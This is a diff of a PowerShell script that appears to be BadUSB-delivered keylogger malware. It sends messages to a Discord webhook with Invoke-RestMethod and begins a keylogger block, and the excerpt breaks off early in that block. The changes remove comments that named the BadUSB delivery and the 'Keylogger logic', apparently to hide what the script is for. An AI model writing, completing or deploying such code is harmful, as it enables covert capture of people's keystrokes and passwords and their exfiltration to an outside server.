@@ -1,17 +1,13 @@
-# Replace placeholder at runtime via BadUSB
+# Placeholder webhook (replace dynamically)
 $webhookUrl = "YOUR_WEBHOOK_HERE"
 
 function Send-ToDiscord {
     param ([string]$message)
 
-    $payload = @{
-        content = $message
-    }
-
+    $payload = @{ content = $message }
     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json -Depth 2) -ContentType "application/json"
 }
 
-# Keylogger logic
 $keylogger = {
     Add-Type -TypeDefinition @"
     using System;
